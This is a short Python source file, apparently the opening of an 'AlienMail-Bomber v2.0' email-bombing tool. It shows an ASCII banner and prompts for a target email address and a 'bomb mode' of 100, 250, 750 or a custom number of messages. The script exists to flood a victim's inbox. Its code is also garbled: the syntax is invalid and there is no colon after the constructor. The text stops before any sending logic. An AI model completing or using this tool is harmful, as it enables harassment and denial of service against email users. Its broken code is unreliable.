'''imports'''
import smtplib
import sys


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
     RED = '\033[91M'


def banner ();
print(bcolors.GREEN'{*}*{*} AlienMail-Bomber v2.0 {*}*{*}')
print(bcolors.GREEN'{*}*{*} Made with secret codes {*}*{*}')
print(bcolors.GREEN + '''  
                       .-.
        .-""`""-.    |(@ @)
     _/`oOoOoOoOo`\_ \ \-/
    '.-=-=-=-=-=-=-.' \/ \
Gh0st `-=.=-.-=.=-'    \ /\
         ^  ^  ^       _H_ \
''')


class Email_Bomber:
    count = 0
    
    def __init__(self)
    try:
        print(bcolors.RED + '\n{*}*{*} Launch sequence initializing {*}*{*}')
        self.target = str(input(bcolors.RED + 'Enter target email <: '))
        self.mode = str(input('Enter bomb mode(1,2,3,4) || 1:(100) 2: (250) 3: (750) 4(custom) <: '))
